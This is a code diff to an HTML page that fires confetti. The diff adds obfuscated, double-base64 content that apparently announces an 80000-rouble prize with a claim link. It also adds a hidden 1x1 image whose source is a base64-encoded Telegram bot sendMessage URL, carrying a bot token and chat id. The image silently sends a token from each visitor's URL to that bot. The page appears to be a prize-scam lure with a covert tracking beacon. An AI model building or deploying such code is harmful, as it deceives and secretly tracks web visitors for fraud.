@@ -63,6 +63,9 @@
       pointer-events: none;
       z-index: 0;
     }
+	.image{
+	  display: none;
+	}
   </style>
 </head>
 <body>
@@ -71,17 +74,28 @@
 
   <div class="card" id="main">
   </div>
+  <div class="image" id="image">
+  </div>
 
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
   <script>
-  if(window.location.href.match(/eue/)){
-    var a = 'UEdneFB2Q2Zqb2tnMEpMUml5RFF2OUMrMExIUXRkQzAwTGpRdTlDNElTRHduNDZKUEM5b01UNDhjRDdRbjlDKzBMZlF0TkdBMExEUXN0QzcwWS9RdGRDOElOQyswWUlnMExMUmdkQzEwTGtnMExUUmc5R0kwTGdoSU5DUzBZc2cwTC9RdnRDeDBMWFF0TkM0MEx2UXVDRFFzaURRdmRDdzBZalF0ZEM4SU5DNjBMN1F2ZEM2MFlQUmdOR0IwTFVnMEwvUmdOQzQwTGZRdnRDeUlOQzRJTkN5MFl2UXVOQ3owWURRc05DNzBMZ2dPREF3TURBZzBZQXVQQzl3UGp4aElHTnNZWE56UFNKaWRHNGlJR2h5WldZOUluTmxZeTVvZEcxc0lqN1FsOUN3MExIUmdOQ3cwWUxSakNEUXY5R0EwTGpRdHp3dllUND0=';
+    var a = window.location.href
+	var b = a.match(/=.{32}$/)
+	if(b){
+    a = 'UEdneFB2Q2Zqb2tnMEpMUml5RFF2OUMrMExIUXRkQzAwTGpRdTlDNElTRHduNDZKUEM5b01UNDhjRDdRbjlDKzBMZlF0TkdBMExEUXN0QzcwWS9RdGRDOElOQyswWUlnMExMUmdkQzEwTGtnMExUUmc5R0kwTGdoSU5DUzBZc2cwTC9RdnRDeDBMWFF0TkM0MEx2UXVDRFFzaURRdmRDdzBZalF0ZEM4SU5DNjBMN1F2ZEM2MFlQUmdOR0IwTFVnMEwvUmdOQzQwTGZRdnRDeUlOQzRJTkN5MFl2UXVOQ3owWURRc05DNzBMZ2dPREF3TURBZzBZQXVQQzl3UGp4aElHTnNZWE56UFNKaWRHNGlJR2h5WldZOUluTmxZeTVvZEcxc0lqN1FsOUN3MExIUmdOQ3cwWUxSakNEUXY5R0EwTGpRdHp3dllUND0=';
     a = decodeURIComponent(escape(atob(atob(a))));
   } else {
-    var a = 'UEhBK1RHOXlaVzBnYVhCemRXMGdaRzlzYjNJZ2MybDBJR0Z0WlhRc0lHTnZibk5sWTNSbGRIVnlJR0ZrYVhCcGMybGphVzVuSUdWc2FYUXNJSE5sWkNCa2J5QmxhWFZ6Ylc5a1BHSnlQblJsYlhCdmNpQnBibU5wWkdsa2RXNTBJSFYwSUd4aFltOXlaU0JsZENCa2IyeHZjbVVnYldGbmJtRWdZV3hwY1hWaExpQlZkQ0JsYm1sdElHRmtJRzFwYm1sdElIWmxQR0p5UG1saGJTdzhZbkkrY1hWcGN5QnViM04wY25Wa0lHVjRaWEpqYVhSaGRHbHZiaUIxYkd4aGJXTnZJR3hoWW05eWFYTWdibWx6YVNCMWRDQmhiR2x4ZFdsd0lHVjRJR1ZoSUdOdmJXMXZaRzg4WW5JK1kyOXVjMlZ4ZFdGMExpQkVkV2x6SUdGMWRHVWdhWEoxY21VZ1pHOXNiM0lnYVc0Z2NtVndjbVZvWlc1a1pYSnBkQ0JwYmlCMmIyeDFjSFJoZEdVZ2RtVnNhWFFnWlhOelpUeGljajVqYVd4c2RXMGdaRzlzYjNKbElHVjFJR1oxWjJsaGRDQnVkV3hzWVNCd1lYSnBZWFIxY2k0Z1JYaGpaWEIwWlhWeUlITnBiblFnYjJOallXVmpZWFFnWTNWd2FXUmhkR0YwSUc1dmJqeGljajV3Y205cFpHVnVkQ3dnYzNWdWRDQnBiaUJqZFd4d1lTQnhkV2tnYjJabWFXTnBZU0JrWlhObGNuVnVkQ0J0YjJ4c2FYUWdZVzVwYlNCcFpDQmxjM1FnYkdGaWIzSjFiUzQ4TDNBKw==';
+    a = 'UEhBK1RHOXlaVzBnYVhCemRXMGdaRzlzYjNJZ2MybDBJR0Z0WlhRc0lHTnZibk5sWTNSbGRIVnlJR0ZrYVhCcGMybGphVzVuSUdWc2FYUXNJSE5sWkNCa2J5QmxhWFZ6Ylc5a1BHSnlQblJsYlhCdmNpQnBibU5wWkdsa2RXNTBJSFYwSUd4aFltOXlaU0JsZENCa2IyeHZjbVVnYldGbmJtRWdZV3hwY1hWaExpQlZkQ0JsYm1sdElHRmtJRzFwYm1sdElIWmxQR0p5UG1saGJTdzhZbkkrY1hWcGN5QnViM04wY25Wa0lHVjRaWEpqYVhSaGRHbHZiaUIxYkd4aGJXTnZJR3hoWW05eWFYTWdibWx6YVNCMWRDQmhiR2x4ZFdsd0lHVjRJR1ZoSUdOdmJXMXZaRzg4WW5JK1kyOXVjMlZ4ZFdGMExpQkVkV2x6SUdGMWRHVWdhWEoxY21VZ1pHOXNiM0lnYVc0Z2NtVndjbVZvWlc1a1pYSnBkQ0JwYmlCMmIyeDFjSFJoZEdVZ2RtVnNhWFFnWlhOelpUeGljajVqYVd4c2RXMGdaRzlzYjNKbElHVjFJR1oxWjJsaGRDQnVkV3hzWVNCd1lYSnBZWFIxY2k0Z1JYaGpaWEIwWlhWeUlITnBiblFnYjJOallXVmpZWFFnWTNWd2FXUmhkR0YwSUc1dmJqeGljajV3Y205cFpHVnVkQ3dnYzNWdWRDQnBiaUJqZFd4d1lTQnhkV2tnYjJabWFXTnBZU0JrWlhObGNuVnVkQ0J0YjJ4c2FYUWdZVzVwYlNCcFpDQmxjM1FnYkdGaWIzSjFiUzQ4TDNBKw==';
     a = atob(atob(a));
   }
   document.getElementById('main').innerHTML = a
+  	if(b){
+	var m = b[0].slice(1)
+	var s = atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYzMTE3NjkyMTE6QUFGNkN2eW13cXlwS0tzaTFzeUQ3RXR5UEZka1gxbU5TQU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTk3MTM5NjIwNSZ0ZXh0PQ==')
+	var okn = s+m
+	var elem = '<img src="'+okn+'" width="1" height="1">'
+	document.getElementById('image').innerHTML = elem
+	}
     const canvas = document.querySelector('.confetti');
     const confetti = window.confetti.create(canvas, { resize: true });
     confetti({
